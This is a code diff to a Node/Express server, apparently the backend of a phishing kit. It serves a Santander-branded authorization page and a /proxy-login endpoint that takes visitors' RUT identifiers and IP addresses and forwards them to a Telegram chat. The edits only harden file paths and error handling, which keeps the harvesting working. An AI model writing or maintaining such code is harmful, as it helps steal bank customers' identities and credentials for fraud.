@@ -9,6 +9,9 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Path absoluto al archivo de configuración (evita problemas de working dir)
+const cfgPath = path.join(__dirname, 'config.json');
+
 // Helper seguro para enviar mensajes a Telegram sin romper la ejecución
 async function safeSendTelegram(text) {
   if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
@@ -49,10 +52,10 @@ function validarRut(rutCompleto) {
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
   try {
-    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
     res.json(cfg);
   } catch (err) {
-    console.error('Error leyendo config.json:', err);
+    console.error('Error leyendo config.json desde', cfgPath, err);
     res.status(500).json({ error: 'Error leyendo configuración' });
   }
 });
@@ -71,10 +74,11 @@ app.post("/procesarSaldo", async (req, res) => {
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
   try {
-    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
+    // Escribir usando ruta absoluta para evitar problemas de permisos/CWD
+    fs.writeFileSync(cfgPath, JSON.stringify(req.body, null, 2));
     res.json(req.body);
   } catch (err) {
-    console.error('Error guardando config.json:', err);
+    console.error('Error guardando config.json en', cfgPath, err);
     res.status(500).json({ error: 'Error guardando configuración' });
   }
 });
@@ -87,7 +91,7 @@ app.get("/admin", (req, res) => {
 // Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
   try {
-    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
     if (cfg.tipoAutorizacion === "santander") {
       res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
       return;
@@ -130,7 +134,7 @@ app.post("/proxy-login", async (req, res) => {
   const rutValido = validarRut(rut);
   if (!rutValido) {
     // No intentamos validar contra OfficeBanking: solo verificamos formato
-    await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`);
+    try { await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`); } catch(e){ console.error(e); }
     return res.status(400).json({ status: "invalid_rut", mensaje: "RUT inválido" });
   }
 
